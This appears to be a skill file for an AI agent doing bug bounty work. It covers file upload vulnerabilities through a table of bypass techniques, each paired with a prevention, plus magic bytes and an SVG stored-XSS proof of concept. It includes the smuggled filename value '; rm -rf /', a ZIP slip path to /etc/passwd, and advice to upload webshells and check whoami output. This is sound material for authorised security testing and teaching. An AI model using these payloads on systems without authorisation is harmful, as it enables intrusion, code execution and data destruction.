---
name: hunt-file-upload
description: "Hunt file upload bugs — RCE via webshell, XSS via SVG/HTML, SSRF via XXE in DOCX, path traversal via filename. Bypass tables (10 techniques): double extension (shell.php.jpg if server checks last ext only), magic bytes spoofing (PNG header on PHP), null byte (shell.php\0.jpg), case (PHP, .Php, .pHP), .htaccess upload to enable execution, SVG with <script>, HTML/SVG XSS, DOCX with embedded XXE, ZIP slip (../../../etc/passwd in archive), polyglot files. Detection: any /upload, /avatar, /profile-picture, /attachment, /import endpoint. Test: upload PHP/JSP/ASPX shells, request via direct URL, check response. Validate: actual code execution (whoami output) for RCE; reflected XSS in profile-photo URL. Use when testing file upload features, avatar/attachment endpoints, import/export functions, XML/DOCX/ZIP processors. Real paid examples."
---

## 9. FILE UPLOAD

### Content-Type Bypass
```
filename=shell.php, Content-Type: image/jpeg  → server trusts Content-Type
filename=shell.phtml, shell.pHp, shell.php5   → extension variants
```

### File Upload Bypass Techniques (10 techniques)

| Attack | How | Prevention |
|---|---|---|
| Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5` | Allowlist + extract final extension |
| Null byte | `shell.php%00.jpg` | Sanitize null bytes |
| Double extension | `shell.jpg.php` | Only allow single extension |
| MIME spoof | Content-Type: image/jpeg with .php body | Validate magic bytes, not MIME header |
| Magic bytes prefix | Prepend `GIF89a;` to PHP code | Parse whole file, not just header |
| Polyglot | Valid as JPEG and PHP | Process as image lib, reject if invalid |
| SVG JavaScript | `<svg onload="...">` | Sanitize SVG or disallow entirely |
| XXE in DOCX | Malicious XML in Office ZIP | Disable external entities |
| ZIP slip | `../../../etc/passwd` in archive | Validate extracted paths |
| Filename injection | `; rm -rf /` in filename | Sanitize + use UUID names |

### Magic Bytes Reference

| Type | Hex |
|---|---|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

### Stored XSS via SVG
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```


